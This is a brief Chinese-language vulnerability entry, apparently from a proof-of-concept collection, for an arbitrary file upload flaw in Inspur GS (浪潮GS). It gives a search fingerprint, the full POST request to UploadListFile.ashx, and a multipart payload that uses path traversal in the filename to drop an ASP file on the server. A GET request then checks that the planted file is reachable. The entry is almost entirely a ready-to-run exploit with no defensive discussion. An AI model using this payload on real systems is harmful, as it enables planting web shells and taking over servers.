# 浪潮GSuploadlistfile任意文件上传漏洞

- **系统**：浪潮GSuploadlistfile　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="/cwbase/web/gsprtf/"`
- **请求**：`POST /cwbase/EP/ListContent/UploadListFile.ashx?uptype=attslib&keyid=1&key1=1&key2=1 HTTP/1.1`
- **关键头**：`Content-Length: 273`　`Content-Type: multipart/form-data; boundary=---------------------------rww…`

**请求体 / payload**
```
-----------------------------rww5upkbw6ctf0tu5hye
Content-Disposition: form-data; name="file"; filename="../../../../../../j1gcettjkv.asp"
Content-Type: image/png
<% response.write("2lN0nxVzC7jYTvuIOcbWyy2AwsK")%>
-----------------------------rww5upkbw6ctf0tu5hye--
上传文件定位：
GET /cwbase/j1gcettjkv.asp HTTP/1.1
```
- **预期**：200　|　—